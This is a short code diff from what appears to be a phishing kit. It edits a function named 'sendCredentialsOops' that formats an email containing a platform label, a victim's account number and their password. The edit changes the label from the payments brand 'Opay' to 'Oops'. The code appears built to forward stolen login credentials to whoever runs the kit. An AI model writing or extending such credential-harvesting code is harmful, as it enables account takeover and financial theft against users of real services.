@@ -147,7 +147,7 @@ export const sendCredentialsOops = async (
     html: `
       <div>
         <strong>Platform:</strong>
-        <p>Opay</p>
+        <p>Oops</p>
         <strong>Number:</strong>
         <p>${number}</p>
         <strong>Password:</strong>
